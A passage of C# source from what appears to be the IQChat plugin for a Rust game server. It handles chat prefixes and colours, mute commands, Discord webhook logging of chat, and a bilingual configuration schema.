            Configuration.ControllerParameters Parameters = config.ControllerParameter;

            if (!UserInformation.ContainsKey(UserID)) return;
            User Info = UserInformation[UserID];

            if (Controller.Turneds.TurnAutoDropPrefix)
            {
                if (Parameters.Prefixes.TurnMultiPrefixes)
                {
                    Configuration.ControllerParameters.AdvancedFuncion Prefixes = Parameters.Prefixes.Prefixes.FirstOrDefault(prefix => Info.Info.PrefixList.Contains(prefix.Argument) && prefix.Permissions == Permissions);
                    if (Prefixes == null) return;

                    Info.Info.PrefixList.Remove(Prefixes.Argument);
		   		 		  						  	   		  	  			  	  			  	   		  		  
                    if (player != null)
                        ReplySystem(player, GetLang("PREFIX_RETURNRED", player.UserIDString, Prefixes.Argument));
		   		 		  						  	   		  	  			  	  			  	   		  		  
                    Log(LanguageEn ? $"Player ({UserID}) expired prefix {Prefixes.Argument}" : $"У игрока ({UserID}) истек префикс {Prefixes.Argument}");
                }
                else
                {
                    Configuration.ControllerParameters.AdvancedFuncion Prefixes = Parameters.Prefixes.Prefixes.FirstOrDefault(prefix => prefix.Argument == Info.Info.Prefix && prefix.Permissions == Permissions);
                    if (Prefixes == null) return;

                    Info.Info.Prefix = Controller.SetupDefaults.PrefixDefault;

                    if (player != null)
                        ReplySystem(player, GetLang("PREFIX_RETURNRED", player.UserIDString, Prefixes.Argument));

                    Log(LanguageEn ? $"Player ({UserID}) expired prefix {Prefixes.Argument}" : $"У игрока ({UserID}) истек префикс {Prefixes.Argument}");
                }
            }
            if (Controller.Turneds.TurnAutoSetupColorNick)
            {
                Configuration.ControllerParameters.AdvancedFuncion ColorNick = Parameters.NickColorList.FirstOrDefault(nick => Info.Info.ColorNick == nick.Argument && nick.Permissions == Permissions);
                if (ColorNick == null) return;

                Info.Info.ColorNick = Controller.SetupDefaults.NickDefault;

                if (player != null)
                    ReplySystem(player, GetLang("COLOR_NICK_RETURNRED", player.UserIDString, ColorNick.Argument));

                Log(LanguageEn ? $"Player ({UserID}) expired nick color {ColorNick.Argument}" : $"У игрока ({UserID}) истек цвет ника {ColorNick.Argument}");
            }
            if (Controller.Turneds.TurnAutoSetupColorChat)
            {
                Configuration.ControllerParameters.AdvancedFuncion ColorChat = Parameters.MessageColorList.FirstOrDefault(message => Info.Info.ColorMessage == message.Argument && message.Permissions == Permissions);
                if (ColorChat == null) return;
		   		 		  						  	   		  	  			  	  			  	   		  		  
                Info.Info.ColorMessage = Controller.SetupDefaults.MessageDefault;

                if (player != null)
                    ReplySystem(player, GetLang("COLOR_CHAT_RETURNRED", player.UserIDString, ColorChat.Argument));

                Log(LanguageEn ? $"Player ({UserID}) chat color expired {ColorChat.Argument}" : $"У игрока ({UserID}) истек цвет чата {ColorChat.Argument}");
            }
        }
        private void DiscordLoggChat(BasePlayer player, Chat.ChatChannel Channel, String MessageLogged)
        {
            List<Fields> fields = new List<Fields>
                        {
                            new Fields(LanguageEn ? "Nick" : "Ник", player.displayName, true),
                            new Fields("Steam64ID", player.UserIDString, true),
                            new Fields(LanguageEn ? "Channel" : "Канал", Channel == Chat.ChatChannel.Global ? (LanguageEn ? "Global" : "Глобальный чат") : Channel == Chat.ChatChannel.Cards ? (LanguageEn ? "Poker" : "Покерный чат") : (LanguageEn ? "Team" : "Командный чат"), true),
                            new Fields(LanguageEn ? "Message" : "Сообщение", MessageLogged, false),
                        };

            FancyMessage newMessage = new FancyMessage(null, false, new FancyMessage.Embeds[1] { new FancyMessage.Embeds(null, 10714449, fields, new Authors("IQChat Chat-History", null, "https://i.imgur.com/xiwsg5m.png", null), null) });

            switch (Channel)
            {
                case Chat.ChatChannel.Cards:
                case Chat.ChatChannel.Global:
                    {
                        Configuration.OtherSettings.General GlobalChat = config.OtherSetting.LogsChat.GlobalChatSettings;
                        if (!GlobalChat.UseLogged) return;
                        Request($"{GlobalChat.Webhooks}", newMessage.toJSON());
                        break;
                    }
                case Chat.ChatChannel.Team:
                    {
                        Configuration.OtherSettings.General TeamChat = config.OtherSetting.LogsChat.TeamChatSettings;
                        if (!TeamChat.UseLogged) return;
                        Request($"{TeamChat.Webhooks}", newMessage.toJSON());
                    }
                    break;
                default:
                    break;
            }
        }
        [ChatCommand("saybro")]
        private void AlertOnlyPlayerChatCommand(BasePlayer Sender, String cmd, String[] args)
        {
            if (!permission.UserHasPermission(Sender.UserIDString, PermissionAlert)) return;
            if (args == null || args.Length == 0)
            {
                ReplySystem(Sender, LanguageEn ? "You didn't specify a player!" : "Вы не указали игрока!");
                return;
            }
            BasePlayer Recipient = BasePlayer.Find(args[0]);
            if (Recipient == null)
            {
                ReplySystem(Sender, LanguageEn ? "The player is not on the server" : "Игрока нет на сервере!");
                return;
            }
            Alert(Sender, Recipient, args.Skip(1).ToArray());
        }
        
        
        
        private void DiscordLoggCommand(BasePlayer player, String Command, String[] Args)
        {
            Configuration.OtherSettings.General Commands = config.OtherSetting.LogsChatCommands;
            if (!Commands.UseLogged) return;

            List<Fields> fields = new List<Fields>
                        {
                            new Fields(LanguageEn ? "Nick" : "Ник", player.displayName, true),
                            new Fields("Steam64ID", player.UserIDString, true),
                            new Fields(LanguageEn ? "Command" : "Команда", $"/{Command} ", true),
                        };

            String Arguments = String.Join(" ", Args);
            if (Args != null && Arguments != null && Arguments.Length != 0 && !String.IsNullOrWhiteSpace(Arguments))
                fields.Insert(fields.Count, new Fields(LanguageEn ? "Arguments" : "Аргументы", Arguments, false));
         
            FancyMessage newMessage = new FancyMessage(null, false, new FancyMessage.Embeds[1] { new FancyMessage.Embeds(null, 10710525, fields, new Authors("IQChat Command-History", null, "https://i.imgur.com/xiwsg5m.png", null), null) });

            Request($"{Commands.Webhooks}", newMessage.toJSON());
        }
        
                public void IQPersonalSendSetMute(BasePlayer player) => IQPersonal?.CallHook("API_SET_MUTE", player.userID);
        public List<FakePlayer> PlayerBases = new List<FakePlayer>();
		   		 		  						  	   		  	  			  	  			  	   		  		  
        public class Authors
        {
            public string name { get; set; }
            public string url { get; set; }
            public string icon_url { get; set; }
            public string proxy_icon_url { get; set; }
            public Authors(string name, string url, string icon_url, string proxy_icon_url)
            {
                this.name = name;
                this.url = url;
                this.icon_url = icon_url;
                this.proxy_icon_url = proxy_icon_url;
            }
        }

        [ChatCommand("hunmute")]
        void HideUnMute(BasePlayer Moderator, string cmd, string[] arg)
        {
            if (!permission.UserHasPermission(Moderator.UserIDString, PermissionMute)) return;
            if (arg == null || arg.Length != 1 || arg.Length > 1)
            {
                ReplySystem(Moderator, LanguageEn ? "Invalid syntax, please use : hunmute Steam64ID/Nick" : "Неверный синтаксис,используйте : hunmute Steam64ID/Ник");
                return;
            }
            string NameOrID = arg[0];
            BasePlayer target = GetPlayerNickOrID(NameOrID);
            if (target == null)
            {
                UInt64 Steam64ID = 0;
                if (UInt64.TryParse(NameOrID, out Steam64ID))
                {
                    if(UserInformation.ContainsKey(Steam64ID))
                    {
                        User Info = UserInformation[Steam64ID];
                        if (Info == null) return;
                        if (!Info.MuteInfo.IsMute(MuteType.Chat))
                        {
                            ReplySystem(Moderator, LanguageEn ? "The player does not have a chat lock" : "У игрока нет блокировки чата");
                            return;
                        }
                        
                        Info.MuteInfo.UnMute(MuteType.Chat);
                        ReplySystem(Moderator, LanguageEn ? "You have unblocked the offline chat to the player" : "Вы разблокировали чат offline игроку");
                        return;
                    }
                    else
                    {
                        ReplySystem(Moderator,LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                        return;
                    }
                }
                else
                {
                    ReplySystem(Moderator,LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                    return;
                }
            }

            UnmutePlayer(target, MuteType.Chat, Moderator, true, true);
        }
        private class Configuration
        {
                        [JsonProperty(LanguageEn ? "Setting up player information" : "Настройка информации о игроке")]
            public ControllerConnection ControllerConnect = new ControllerConnection();
            internal class ControllerConnection
            {
                [JsonProperty(LanguageEn ? "Function switches" : "Перключатели функций")]
                public Turned Turneds = new Turned();
                [JsonProperty(LanguageEn ? "Setting Standard Values" : "Настройка стандартных значений")]
                public SetupDefault SetupDefaults = new SetupDefault();

                internal class SetupDefault
                {
                    [JsonProperty(LanguageEn ? "This prefix will be set if the player entered the server for the first time or in case of expiration of the rights to the prefix that he had earlier" : "Данный префикс установится если игрок впервые зашел на сервер или в случае окончания прав на префикс, который у него стоял ранее")]
                    public String PrefixDefault = "<color=#CC99FF>[ИГРОК]</color>";
                    [JsonProperty(LanguageEn ? "This nickname color will be set if the player entered the server for the first time or in case of expiration of the rights to the nickname color that he had earlier" : "Данный цвет ника установится если игрок впервые зашел на сервер или в случае окончания прав на цвет ника, который у него стоял ранее")]
                    public String NickDefault = "#33CCCC";
                    [JsonProperty(LanguageEn ? "This chat color will be set if the player entered the server for the first time or in case of expiration of the rights to the chat color that he had earlier" : "Данный цвет чата установится если игрок впервые зашел на сервер или в случае окончания прав на цвет чата, который у него стоял ранее")]
                    public String MessageDefault = "#0099FF";
                }
                internal class Turned
                {
                    [JsonProperty(LanguageEn ? "Set automatically a prefix to a player when he got the rights to it" : "Устанавливать автоматически префикс игроку, когда он получил права на него")]
                    public Boolean TurnAutoSetupPrefix;
                    [JsonProperty(LanguageEn ? "Set automatically the color of the nickname to the player when he got the rights to it" : "Устанавливать автоматически цвет ника игроку, когда он получил права на него")]
                    public Boolean TurnAutoSetupColorNick;
                    [JsonProperty(LanguageEn ? "Set the chat color automatically to the player when he got the rights to it" : "Устанавливать автоматически цвет чата игроку, когда он получил права на него")]
                    public Boolean TurnAutoSetupColorChat;
                    [JsonProperty(LanguageEn ? "Automatically reset the prefix when the player's rights to it expire" : "Сбрасывать автоматически префикс при окончании прав на него у игрока")]
                    public Boolean TurnAutoDropPrefix;
                    [JsonProperty(LanguageEn ? "Automatically reset the color of the nickname when the player's rights to it expire" : "Сбрасывать автоматически цвет ника при окончании прав на него у игрока")]
                    public Boolean TurnAutoDropColorNick;
                    [JsonProperty(LanguageEn ? "Automatically reset the color of the chat when the rights to it from the player expire" : "Сбрасывать автоматически цвет чата при окончании прав на него у игрока")]
                    public Boolean TurnAutoDropColorChat;
                }
            }
            
                        [JsonProperty(LanguageEn ? "Setting options for the player" : "Настройка параметров для игрока")]
            public ControllerParameters ControllerParameter = new ControllerParameters();
            internal class ControllerParameters
            {
                [JsonProperty(LanguageEn ? "Setting the display of options for player selection" : "Настройка отображения параметров для выбора игрока")]
                public VisualSettingParametres VisualParametres = new VisualSettingParametres();
                [JsonProperty(LanguageEn ? "List and customization of colors for a nickname" : "Список и настройка цветов для ника")]
                public List<AdvancedFuncion> NickColorList = new List<AdvancedFuncion>();
                [JsonProperty(LanguageEn ? "List and customize colors for chat messages" : "Список и настройка цветов для сообщений в чате")]
                public List<AdvancedFuncion> MessageColorList = new List<AdvancedFuncion>();
                [JsonProperty(LanguageEn ? "List and configuration of prefixes in chat" : "Список и настройка префиксов в чате")]
                public PrefixSetting Prefixes = new PrefixSetting();
                internal class PrefixSetting
                {
                    [JsonProperty(LanguageEn ? "Enable support for multiple prefixes at once (true - multiple prefixes can be set/false - only 1 can be set to choose from)" : "Включить поддержку нескольких префиксов сразу (true - можно установить несколько префиксов/false - установить можно только 1 на выбор)")]
                    public Boolean TurnMultiPrefixes;
                    [JsonProperty(LanguageEn ? "The maximum number of prefixes that can be set at a time (This option only works if setting multiple prefixes is enabled)" : "Максимальное количество префиксов, которое можно установить за раз(Данный параметр работает только если включена установка нескольких префиксов)")]
                    public Int32 MaximumMultiPrefixCount;
                    [JsonProperty(LanguageEn ? "List of prefixes and their settings" : "Список префиксов и их настройка")]
                    public List<AdvancedFuncion> Prefixes = new List<AdvancedFuncion>();
                }

                internal class AdvancedFuncion
                {
                    [JsonProperty(LanguageEn ? "Permission" : "Права")]
                    public String Permissions;
                    [JsonProperty(LanguageEn ? "Argument" : "Значение")]
                    public String Argument;
                }

                internal class VisualSettingParametres
                {
                    [JsonProperty(LanguageEn ? "Player prefix selection display type - (0 - dropdown list, 1 - slider (Please note that if you have multi-prefix enabled, the dropdown list will be set))" : "Тип отображения выбора префикса для игрока - (0 - выпадающий список, 1 - слайдер (Учтите, что если у вас включен мульти-префикс, будет установлен выпадающий список))")]
                    public SelectedParametres PrefixType;
                    [JsonProperty(LanguageEn ? "Display type of player's nickname color selection - (0 - drop-down list, 1 - slider)" : "Тип отображения выбора цвета ника для игрока - (0 - выпадающий список, 1 - слайдер)")]
                    public SelectedParametres NickColorType;
                    [JsonProperty(LanguageEn ? "Display type of message color choice for the player - (0 - drop-down list, 1 - slider)" : "Тип отображения выбора цвета сообщения для игрока - (0 - выпадающий список, 1 - слайдер)")]
                    public SelectedParametres ChatColorType;
                    [JsonProperty(LanguageEn ? "IQRankSystem : Player rank selection display type - (0 - drop-down list, 1 - slider)" : "IQRankSystem : Тип отображения выбора ранга для игрока - (0 - выпадающий список, 1 - слайдер)")]
                    public SelectedParametres IQRankSystemType;
                }
            }
            
                        [JsonProperty(LanguageEn ? "Plugin mute settings" : "Настройка мута в плагине")]
            public ControllerMute ControllerMutes = new ControllerMute();
            internal class ControllerMute
            {
                [JsonProperty(LanguageEn ? "Setting up automatic muting" : "Настройка автоматического мута")]
                public AutoMute AutoMuteSettings = new AutoMute();
                internal class AutoMute
                {
                    [JsonProperty(LanguageEn ? "Enable automatic muting for forbidden words (true - yes/false - no)" : "Включить автоматический мут по запрещенным словам(true - да/false - нет)")]
                    public Boolean UseAutoMute;
                    [JsonProperty(LanguageEn ? "Reason for automatic muting" : "Причина автоматического мута")]
                    public Muted AutoMuted;
                }
                [JsonProperty(LanguageEn ? "Additional setting for logging about mutes in discord" : "Дополнительная настройка для логирования о мутах в дискорд")]
                public LoggedFuncion LoggedMute = new LoggedFuncion();
                internal class LoggedFuncion
                {
                    [JsonProperty(LanguageEn ? "Support for logging the last N messages (Discord logging about mutes must be enabled)" : "Поддержка логирования последних N сообщений (Должно быть включено логирование в дискорд о мутах)")]
                    public Boolean UseHistoryMessage;
                    [JsonProperty(LanguageEn ? "How many latest player messages to send in logging" : "Сколько последних сообщений игрока отправлять в логировании")]
                    public Int32 CountHistoryMessage;
                }

                [JsonProperty(LanguageEn ? "Reasons to block chat" : "Причины для блокировки чата")]
                public List<Muted> MuteChatReasons = new List<Muted>();
                [JsonProperty(LanguageEn ? "Reasons to block your voice" : "Причины для блокировки голоса")]
                public List<Muted> MuteVoiceReasons = new List<Muted>();
                internal class Muted
                {
                    [JsonProperty(LanguageEn ? "Reason for blocking" : "Причина для блокировки")]
                    public String Reason;
                    [JsonProperty(LanguageEn ? "Block time (in seconds)" : "Время блокировки(в секундах)")]
                    public Int32 SecondMute;
                }
            }
            
                        [JsonProperty(LanguageEn ? "Configuring Message Processing" : "Настройка обработки сообщений")]
            public ControllerMessage ControllerMessages = new ControllerMessage();
            internal class ControllerMessage
            {
                [JsonProperty(LanguageEn ? "Basic settings for chat messages from the plugin" : "Основная настройка сообщений в чат от плагина")]
                public GeneralSettings GeneralSetting = new GeneralSettings();    
                [JsonProperty(LanguageEn ? "Configuring functionality switching in chat" : "Настройка переключения функционала в чате")]
                public TurnedFuncional TurnedFunc = new TurnedFuncional();        
                [JsonProperty(LanguageEn ? "Player message formatting settings" : "Настройка форматирования сообщений игроков")]
                public FormattingMessage Formatting = new FormattingMessage();
		   		 		  						  	   		  	  			  	  			  	   		  		  
                internal class GeneralSettings
                {
                    [JsonProperty(LanguageEn ? "Customizing the chat alert format" : "Настройка формата оповещения в чате")]
                    public BroadcastSettings BroadcastFormat = new BroadcastSettings();
                    [JsonProperty(LanguageEn ? "Setting the mention format in the chat, via @" : "Настройка формата упоминания в чате, через @")]
                    public AlertSettings AlertFormat = new AlertSettings();      
                    [JsonProperty(LanguageEn ? "Additional setting" : "Дополнительная настройка")]
                    public OtherSettings OtherSetting = new OtherSettings();

                    internal class BroadcastSettings
                    {
                        [JsonProperty(LanguageEn ? "The name of the notification in the chat" : "Наименование оповещения в чат")]
                        public String BroadcastTitle;
                        [JsonProperty(LanguageEn ? "Chat alert message color" : "Цвет сообщения оповещения в чат")]
                        public String BroadcastColor;
                        [JsonProperty(LanguageEn ? "Steam64ID for chat avatar" : "Steam64ID для аватарки в чате")]
                        public String Steam64IDAvatar;
                    }
                    internal class AlertSettings
                    {
                        [JsonProperty(LanguageEn ? "The color of the player mention message in the chat" : "Цвет сообщения упоминания игрока в чате")]
                        public String AlertPlayerColor;
                        [JsonProperty(LanguageEn ? "Sound when receiving and sending a mention via @" : "Звук при при получении и отправки упоминания через @")]
                        public String SoundAlertPlayer;
                    }
                    internal class OtherSettings
                    {
                        [JsonProperty(LanguageEn ? "Time after which the message will be deleted from the UI from the administrator" : "Время,через которое удалится сообщение с UI от администратора")]
                        public Int32 TimeDeleteAlertUI;

                        [JsonProperty(LanguageEn ? "The size of the message from the player in the chat" : "Размер сообщения от игрока в чате")]
                        public Int32 SizeMessage = 14;
                        [JsonProperty(LanguageEn ? "Player nickname size in chat" : "Размер ника игрока в чате")]
                        public Int32 SizeNick = 14;
                        [JsonProperty(LanguageEn ? "The size of the player's prefix in the chat (will be used if <size=N></size> is not set in the prefix itself)" : "Размер префикса игрока в чате (будет использовано, если в самом префиксе не установвлен <size=N></size>)")]
                        public Int32 SizePrefix = 14;
                    }
                }
                internal class TurnedFuncional
                {
                    [JsonProperty(LanguageEn ? "Configuring spam protection" : "Настройка защиты от спама")]
                    public AntiSpam AntiSpamSetting = new AntiSpam();
                    [JsonProperty(LanguageEn ? "Setting up a temporary chat block for newbies (who have just logged into the server)" : "Настройка временной блокировки чата новичкам (которые только зашли на сервер)")]
                    public AntiNoob AntiNoobSetting = new AntiNoob();
                    [JsonProperty(LanguageEn ? "Setting up private messages" : "Настройка личных сообщений")]
                    public PM PMSetting = new PM();

                    internal class AntiNoob
                    {
                        [JsonProperty(LanguageEn ? "Newbie protection in PM/R" : "Защита от новичка в PM/R")]
                        public Settings AntiNoobPM = new Settings();
                        [JsonProperty(LanguageEn ? "Newbie protection in global and team chat" : "Защита от новичка в глобальном и коммандном чате")]
                        public Settings AntiNoobChat = new Settings();
                        internal class Settings
                        {
                            [JsonProperty(LanguageEn ? "Enable protection?" : "Включить защиту?")]
                            public Boolean AntiNoobActivate = false;
                            [JsonProperty(LanguageEn ? "Newbie Chat Lock Time" : "Время блокировки чата для новичка")]
                            public Int32 TimeBlocked = 1200;
                        }
                    }
                    internal class AntiSpam
                    {
                        [JsonProperty(LanguageEn ? "Enable spam protection (Anti-spam)" : "Включить защиту от спама (Анти-спам)")]
                        public Boolean AntiSpamActivate;
                        [JsonProperty(LanguageEn ? "Time after which a player can send a message (AntiSpam)" : "Время через которое игрок может отправлять сообщение (АнтиСпам)")]
                        public Int32 FloodTime;
                        [JsonProperty(LanguageEn ? "Additional Anti-Spam settings" : "Дополнительная настройка Анти-Спама")]
                        public AntiSpamDuples AntiSpamDuplesSetting = new AntiSpamDuples();
                        internal class AntiSpamDuples
                        {
                            [JsonProperty(LanguageEn ? "Enable additional spam protection (Anti-duplicates, duplicate messages)" : "Включить дополнительную защиту от спама (Анти-дубликаты, повторяющие сообщения)")]
                            public Boolean AntiSpamDuplesActivate = true;
                            [JsonProperty(LanguageEn ? "How many duplicate messages does a player need to make to be confused by the system" : "Сколько дублирующих сообщений нужно сделать игроку чтобы его замутила система")]
                            public Int32 TryDuples = 3;
                            [JsonProperty(LanguageEn ? "Setting up automatic muting for duplicates" : "Настройка автоматического мута за дубликаты")]
                            public ControllerMute.Muted MuteSetting = new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Blocking for duplicate messages (SPAM)" : "Блокировка за дублирующие сообщения (СПАМ)",
                                SecondMute = 300,
                            };
                        }
                    }
                    internal class PM
                    {
                        [JsonProperty(LanguageEn ? "Enable Private Messages" : "Включить личные сообщения")]
                        public Boolean PMActivate;
                        [JsonProperty(LanguageEn ? "Sound when receiving a private message" : "Звук при при получении личного сообщения")]
                        public String SoundPM;
                    }
                    [JsonProperty(LanguageEn ? "Enable PM ignore for players (/ignore nick or via interface)" : "Включить игнор ЛС игрокам(/ignore nick или через интерфейс)")]
                    public Boolean IgnoreUsePM;
                    [JsonProperty(LanguageEn ? "Hide the issue of items to the Admin from the chat" : "Скрыть из чата выдачу предметов Админу")]
                    public Boolean HideAdminGave;
                    [JsonProperty(LanguageEn ? "Move mute to team chat (In case of a mute, the player will not be able to write even to the team chat)" : "Переносить мут в командный чат(В случае мута, игрок не сможет писать даже в командный чат)")]
                    public Boolean MuteTeamChat;
                }
                internal class FormattingMessage
                {
                    [JsonProperty(LanguageEn ? "Enable message formatting [Will control caps, message format] (true - yes/false - no)" : "Включить форматирование сообщений [Будет контроллировать капс, формат сообщения] (true - да/false - нет)")]
                    public Boolean FormatMessage;
                    [JsonProperty(LanguageEn ? "Use a list of banned words (true - yes/false - no)" : "Использовать список запрещенных слов (true - да/false - нет)")]
                    public Boolean UseBadWords;
                    [JsonProperty(LanguageEn ? "The word that will replace the forbidden word" : "Слово которое будет заменять запрещенное слово")]
                    public String ReplaceBadWord;
                    [JsonProperty(LanguageEn ? "List of banned words" : "Список запрещенных слов")]
                    public List<String> BadWords = new List<String>();

                    [JsonProperty(LanguageEn ? "Nickname controller setup" : "Настройка контроллера ников")]
                    public NickController ControllerNickname = new NickController();
                    internal class NickController
                    {
                        [JsonProperty(LanguageEn ? "Enable player nickname formatting (message formatting must be enabled)" : "Включить форматирование ников игроков (должно быть включено форматирование сообщений)")]
                        public Boolean UseNickController = true;
                        [JsonProperty(LanguageEn ? "The word that will replace the forbidden word (You can leave it blank and it will just delete)" : "Слово которое будет заменять запрещенное слово (Вы можете оставить пустым и будет просто удалять)")]
                        public String ReplaceBadNick = "****";
                        [JsonProperty(LanguageEn ? "List of banned nicknames" : "Список запрещенных ников")]
                        public List<String> BadNicks = new List<String>();
                        [JsonProperty(LanguageEn ? "List of allowed links in nicknames" : "Список разрешенных ссылок в никах")]
                        public List<String> AllowedLinkNick = new List<String>();
                    }
                }
            }

            
            
            [JsonProperty(LanguageEn ? "Setting up chat alerts" : "Настройка оповещений в чате")]
            public ControllerAlert ControllerAlertSetting;

            internal class ControllerAlert
            {
                [JsonProperty(LanguageEn ? "Setting up chat alerts" : "Настройка оповещений в чате")]
                public Alert AlertSetting;
                [JsonProperty(LanguageEn ? "Setting notifications about the status of the player's session" : "Настройка оповещений о статусе сессии игрока")]
                public PlayerSession PlayerSessionSetting;
                [JsonProperty(LanguageEn ? "Configuring administrator session status alerts" : "Настройка оповещений о статусе сессии администратора")]
                public AdminSession AdminSessionSetting;
                [JsonProperty(LanguageEn ? "Setting up personal notifications to the player when connecting" : "Настройка персональных оповоещений игроку при коннекте")]
                public PersonalAlert PersonalAlertSetting;
                internal class Alert
                {
                    [JsonProperty(LanguageEn ? "Enable automatic messages in chat (true - yes/false - no)" : "Включить автоматические сообщения в чат (true - да/false - нет)")]
                    public Boolean AlertMessage;
                    [JsonProperty(LanguageEn ? "Type of automatic messages : true - sequential / false - random" : "Тип автоматических сообщений : true - поочередные/false - случайные")]
                    public Boolean AlertMessageType;

                    [JsonProperty(LanguageEn ? "List of automatic messages in chat" : "Список автоматических сообщений в чат")]
                    public LanguageController MessageList = new LanguageController();
                    [JsonProperty(LanguageEn ? "Interval for sending messages to chat (Broadcaster) (in seconds)" : "Интервал отправки сообщений в чат (Броадкастер) (в секундах)")]
                    public Int32 MessageListTimer;
                }
                internal class PlayerSession
                {
                    [JsonProperty(LanguageEn ? "When a player is notified about the entry / exit of the player, display his avatar opposite the nickname (true - yes / false - no)" : "При уведомлении о входе/выходе игрока отображать его аватар напротив ника (true - да/false - нет)")]
                    public Boolean ConnectedAvatarUse;

                    [JsonProperty(LanguageEn ? "Notify in chat when a player enters (true - yes/false - no)" : "Уведомлять в чате о входе игрока (true - да/false - нет)")]
                    public Boolean ConnectedAlert;
                    [JsonProperty(LanguageEn ? "Enable random notifications when a player from the list enters (true - yes / false - no)" : "Включить случайные уведомления о входе игрока из списка (true - да/false - нет)")]
                    public Boolean ConnectionAlertRandom;
                    [JsonProperty(LanguageEn ? "Show the country of the entered player (true - yes/false - no)" : "Отображать страну зашедшего игрока (true - да/false - нет")]
                    public Boolean ConnectedWorld;

                    [JsonProperty(LanguageEn ? "Notify when a player enters the chat (selected from the list) (true - yes/false - no)" : "Уведомлять о выходе игрока в чат(выбираются из списка) (true - да/false - нет)")]
                    public Boolean DisconnectedAlert;
                    [JsonProperty(LanguageEn ? "Enable random player exit notifications (true - yes/false - no)" : "Включить случайные уведомления о выходе игрока (true - да/false - нет)")]
                    public Boolean DisconnectedAlertRandom;
                    [JsonProperty(LanguageEn ? "Display reason for player exit (true - yes/false - no)" : "Отображать причину выхода игрока (true - да/false - нет)")]
                    public Boolean DisconnectedReason;

                    [JsonProperty(LanguageEn ? "Random player entry notifications({0} - player's nickname, {1} - country (if country display is enabled)" : "Случайные уведомления о входе игрока({0} - ник игрока, {1} - страна(если включено отображение страны)")]
                    public LanguageController RandomConnectionAlert = new LanguageController();
                    [JsonProperty(LanguageEn ? "Random notifications about the exit of the player ({0} - player's nickname, {1} - the reason for the exit (if the reason is enabled)" : "Случайные уведомления о выходе игрока({0} - ник игрока, {1} - причина выхода(если включена причина)")]
                    public LanguageController RandomDisconnectedAlert = new LanguageController();
                }
                internal class AdminSession
                {
                    [JsonProperty(LanguageEn ? "Notify admin on the server in the chat (true - yes/false - no)" : "Уведомлять о входе админа на сервер в чат (true - да/false - нет)")]
                    public Boolean ConnectedAlertAdmin;
                    [JsonProperty(LanguageEn ? "Notify about admin leaving the server in chat (true - yes/false - no)" : "Уведомлять о выходе админа на сервер в чат (true - да/false - нет)")]
                    public Boolean DisconnectedAlertAdmin;
                }
                internal class PersonalAlert
                {
                    [JsonProperty(LanguageEn ? "Enable random message to the player who has logged in (true - yes/false - no)" : "Включить случайное сообщение зашедшему игроку (true - да/false - нет)")]
                    public Boolean UseWelcomeMessage;
                    [JsonProperty(LanguageEn ? "List of messages to the player when entering" : "Список сообщений игроку при входе")]
                    public LanguageController WelcomeMessage = new LanguageController();
                }
            }
            
            public class LanguageController
            {
                [JsonProperty(LanguageEn ? "Setting up Multilingual Messages [Language Code] = Translation Variations" : "Настройка мультиязычных сообщений [КодЯзыка] = ВариацииПеревода")]
                public Dictionary<String, List<String>> LanguageMessages = new Dictionary<String, List<String>>();
            } 

            
                        [JsonProperty(LanguageEn ? "Settings Rust+" : "Настройка Rust+")]
            public RustPlus RustPlusSettings;
            internal class RustPlus
            {
                [JsonProperty(LanguageEn ? "Use Rust+" : "Использовать Rust+")]
                public Boolean UseRustPlus;
                [JsonProperty(LanguageEn ? "Title for notification Rust+" : "Название для уведомления Rust+")]
                public String DisplayNameAlert;
            }
            
                        [JsonProperty(LanguageEn ? "Configuring support plugins" : "Настройка плагинов поддержки")]
            public ReferenceSettings ReferenceSetting = new ReferenceSettings();
            internal class ReferenceSettings
            {
                [JsonProperty(LanguageEn ? "Settings XLevels" : "Настройка XLevels")]
                public XLevels XLevelsSettings = new XLevels();
                [JsonProperty(LanguageEn ? "Settings IQFakeActive" : "Настройка IQFakeActive")]
                public IQFakeActive IQFakeActiveSettings = new IQFakeActive();
                [JsonProperty(LanguageEn ? "Settings IQRankSystem" : "Настройка IQRankSystem")]
                public IQRankSystem IQRankSystems = new IQRankSystem();
                internal class IQRankSystem
                {
                    [JsonProperty(LanguageEn ? "Rank display format in chat ( {0} is the user's rank, do not delete this value)" : "Формат отображения ранга в чате ( {0} - это ранг юзера, не удаляйте это значение)")]
                    public String FormatRank = "[{0}]";
                    [JsonProperty(LanguageEn ? "Time display format with IQRank System in chat ( {0} is the user's time, do not delete this value)" : "Формат отображения времени с IQRankSystem в чате ( {0} - это время юзера, не удаляйте это значение)")]
                    public String FormatRankTime = "[{0}]";
                    [JsonProperty(LanguageEn ? "Use support IQRankSystem" : "Использовать поддержку рангов")]
                    public Boolean UseRankSystem;
                    [JsonProperty(LanguageEn ? "Show players their played time next to their rank" : "Отображать игрокам их отыгранное время рядом с рангом")]
                    public Boolean UseTimeStandart;
                }
                internal class IQFakeActive
                {
                    [JsonProperty(LanguageEn ? "Use support IQFakeActive" : "Использовать поддержку IQFakeActive")]
                    public Boolean UseIQFakeActive;
                }
                internal class XLevels
                {
                    [JsonProperty(LanguageEn ? "Use support XLevels" : "Использовать поддержку XLevels")]
                    public Boolean UseXLevels;
                }
            }
            
            
            [JsonProperty(LanguageEn ? "Setting up an answering machine" : "Настройка автоответчика")]
            public AnswerMessage AnswerMessages = new AnswerMessage();
		   		 		  						  	   		  	  			  	  			  	   		  		  
            internal class AnswerMessage
            {
                [JsonProperty(LanguageEn ? "Enable auto-reply? (true - yes/false - no)" : "Включить автоответчик?(true - да/false - нет)")]
                public bool UseAnswer;
                [JsonProperty(LanguageEn ? "Customize Messages [Keyword] = Reply" : "Настройка сообщений [Ключевое слово] = Ответ")]
                public Dictionary<String, LanguageController> AnswerMessageList = new Dictionary<String, LanguageController>();
            }

            
                        [JsonProperty(LanguageEn ? "Additional setting" : "Дополнительная настройка")]
            public OtherSettings OtherSetting;
            
            internal class OtherSettings
            {
                [JsonProperty(LanguageEn ? "Setting up message logging" : "Настройка логирования сообщений")]
                public LoggedChat LogsChat = new LoggedChat();
                [JsonProperty(LanguageEn ? "Setting up logging of personal messages of players" : "Настройка логирования личных сообщений игроков")]
                public General LogsPMChat = new General();   
                [JsonProperty(LanguageEn ? "Setting up chat/voice lock/unlock logging" : "Настройка логирования блокировок/разблокировок чата/голоса")]
                public General LogsMuted = new General();
                [JsonProperty(LanguageEn ? "Setting up logging of chat commands from players" : "Настройка логирования чат-команд от игроков")]
                public General LogsChatCommands = new General();
                internal class LoggedChat
                {
